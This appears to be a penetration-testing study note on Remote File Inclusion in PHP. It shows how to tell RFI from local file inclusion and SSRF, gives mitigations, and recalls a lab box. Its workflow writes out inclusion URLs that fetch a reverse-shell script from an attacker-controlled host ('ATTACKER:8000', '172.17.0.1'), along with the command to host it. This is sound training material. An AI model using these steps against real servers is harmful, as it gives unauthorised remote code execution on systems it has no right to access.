---
type: technique
tags: [ejpt:web-pentest]
tools: [curl, wget]
cves: []
related: ["[[local-file-inclusion]]", "[[server-side-request-forgery]]", "[[reverse-shells]]"]
---

# Remote File Inclusion (RFI)

The application **includes/executes** a file at a URL you supply — classically `include($_GET['param'])` in PHP with `allow_url_include=On`. Unlike a plain fetch, the remote content runs *in the application's context*, so RFI is **code execution**, not just a read.

## Tell it apart (same input, three classes)

The parameter looks identical in all three cases — decide by **what you can make it do**:

| Response to `?param=…` | Class |
|---|---|
| a file's contents printed from disk (`../../../etc/passwd`) | [[local-file-inclusion]] |
| a remote page fetched and echoed, nothing executes | [[server-side-request-forgery]] |
| your hosted **script runs** and calls back | **RFI** |

Prove it in that order: read a local file → fetch a URL you watch on your own server → serve a payload from it. The step that *fails* tells you where the ceiling is.

## Workflow

1. **Confirm reachability** — `?param=http://ATTACKER:8000` and watch your access log. If it hits, the sink makes outbound requests.
2. **Host the payload** where the target can reach it: `python3 -m http.server 8000` with `revshell.php` in the directory.
3. **Feed the full URL** — `?param=http://ATTACKER:8000/revshell.php` → callback as the web user ([[reverse-shells]]).

## Why the naive fuzz comes back empty

Fuzzing the parameter with an LFI path wordlist (`LFI-Jhaddix.txt`) finds nothing when the sink expects a **scheme-prefixed URL**, not a path. A silent fuzz result means *wrong vocabulary*, not *no bug*: probe the input's expected shape (bare word → path? `http://` → URL?) before you fuzz ([[parameter-fuzzing]]).

## What stops it

- `allow_url_include=Off` (the PHP default) kills RFI outright — the same sink then degrades to SSRF-only.
- Scheme/host whitelisting, or a fetch-and-serve proxy that never passes your string to an include.

## Seen in

[[rutas]] (`index.php?love=` — `http://172.17.0.1:8000` reached Kali's server, and `…/revshell.php` from that same server came back as `www-data`, which is what separates the RFI from a plain SSRF)
